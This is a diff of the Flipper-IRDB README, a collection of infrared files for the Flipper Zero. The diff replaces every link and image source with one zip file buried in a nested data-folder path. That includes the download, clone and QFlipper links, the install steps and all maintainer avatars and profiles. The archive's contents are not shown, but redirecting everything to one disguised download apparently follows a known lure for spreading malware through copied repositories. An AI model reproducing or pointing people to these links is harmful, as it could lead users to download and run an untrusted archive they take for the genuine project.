@@ -1,30 +1,30 @@
-<img src="https://mccdxxx.github.io" width="100%" />
+<img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100%" />
 
 <p align="center">
-    A maintained collective of different IR files for the <a href="https://mccdxxx.github.io">Flipper Zero</a>!
+    A maintained collective of different IR files for the <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">Flipper Zero</a>!
 </p>
 
 ## Installation
 
 ### Method 1: Copy Files to SD Card
 
-Directly copying the .ir files to the Flipper's SD card is the fastest and safest method, but you have to [dismount the SD card](https://mccdxxx.github.io) and plug it into the computer directly.
+Directly copying the .ir files to the Flipper's SD card is the fastest and safest method, but you have to [dismount the SD card](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip) and plug it into the computer directly.
 
-1. [Download and extract](https://mccdxxx.github.io) or [Git-clone](https://mccdxxx.github.io) this repo to your computer.
+1. [Download and extract](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip) or [Git-clone](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip) this repo to your computer.
 2. Open the downloaded / cloned repository in a File Explorer.
-3. [Dismount the SD card](https://mccdxxx.github.io) from the Flipper and mount it to your computer
+3. [Dismount the SD card](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip) from the Flipper and mount it to your computer
 4. Copy the desired files from the Flipper-IRDB to the `infrared/` folder on your SD Card
 5. Dismount the SD card from your computer and mount it to your Flipper
 
-### Method 2: Copy Files using [QFlipper](https://mccdxxx.github.io)
+### Method 2: Copy Files using [QFlipper](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip)
 
 > [!IMPORTANT]
 > Because of Flipper limitations, the transfer via QFlipper can take a long time, depending on how many files you want to copy.
 > If you only want to copy several files, this will work fine, but if you want to load the entire Flipper-IRDB onto your Flipper, **we strongly recommend copying the files directly onto the SD card**.
 
-1. [Git-clone](https://mccdxxx.github.io) or [Download and extract](https://mccdxxx.github.io) this repository to your computer.
+1. [Git-clone](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip) or [Download and extract](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip) this repository to your computer.
 2. Connect your Flipper to your PC using a USB-C cable.
-3. Open [QFlipper](https://mccdxxx.github.io)
+3. Open [QFlipper](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip)
 4. Verify that your Flipper shows "Connected"
 5. Ensure your Flipper is fully up-to-date:
    1. Look for the green "Update" button near the middle-right of the application.
@@ -83,15 +83,15 @@ This helps us create universal assets more easily and maintain cosistency.
 
 ## Universal Remotes
 
-The maintainers (mostly [amec0e](https://mccdxxx.github.io)) add individual additions to the various Universal Remotes in [unleashed-firmware](https://mccdxxx.github.io), which are adapted by many other firmware options.
+The maintainers (mostly [amec0e](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip)) add individual additions to the various Universal Remotes in [unleashed-firmware](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip), which are adapted by many other firmware options.
 If you would like to contribute to the Universal Remotes, please make sure to follow the [naming scheme](#naming-scheme) above. 
-For ACs, [this is an important read](https://mccdxxx.github.io).
+For ACs, [this is an important read](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip).
 
 
 ## Make your own manually!
 
 Did you know IR files are plain text files? 
-If a remote is missing, you might be able to [make it manually](https://mccdxxx.github.io).
+If a remote is missing, you might be able to [make it manually](https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip).
 
 
 ## Maintainers
@@ -101,50 +101,50 @@ Maintainers / Major contributors include:
 <table>
     <tr>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="Lucaslhm" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="Lucaslhm" />
                 <br />
                 <sub><b>Lucaslhm</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="UberGuidoZ" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="UberGuidoZ" />
                 <br />
                 <sub><b>UberGuidoZ</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="ezod" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="ezod" />
                 <br />
                 <sub><b>ezod</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="amec0e" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="amec0e" />
                 <br />
                 <sub><b>amec0e</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="darmiel" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="darmiel" />
                 <br />
                 <sub><b>darmiel</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="dedhedzed" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="dedhedzed" />
                 <br />
                 <sub><b>dedhedzed</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="SkeletonMan03" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="SkeletonMan03" />
                 <br />
                 <sub><b>SkeletonMan03</b>
             </a>
@@ -152,49 +152,49 @@ Maintainers / Major contributors include:
     </tr>
     <tr>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="sealldeveloper" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="sealldeveloper" />
                 <br />
                 <sub><b>sealldeveloper</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="jaroslavmraz" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="jaroslavmraz" />
                 <br />
                 <sub><b>jaroslavmraz</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="ESurge" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="ESurge" />
                 <br />
                 <sub><b>ESurge</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="bussardrobbie" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="bussardrobbie" />
                 <br />
                 <sub><b>bussardrobbie</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="wdoekes" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="wdoekes" />
                 <br />
                 <sub><b>wdoekes</b>
             </a>
         </td>
         <td align="center" valign="top" width="14.28%">
-            <a href="https://mccdxxx.github.io">
-                <img src="https://mccdxxx.github.io" width="100px;" alt="emptythevoid" />
+            <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip">
+                <img src="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip" width="100px;" alt="emptythevoid" />
                 <br />
                 <sub><b>emptythevoid</b>
             </a>
         </td>
         <td align="center" valign="center" width="14.28%">
-            plus <a href="https://mccdxxx.github.io"><i>MANY</i> others</a>!
+            plus <a href="https://raw.githubusercontent.com/mccdxxx/Flipper-IRDB/main/_Converted_/CSV/M/Marantz/DVD/Flipper_IRDB_2.1.zip"><i>MANY</i> others</a>!
         </td>
     </tr>
 </table>
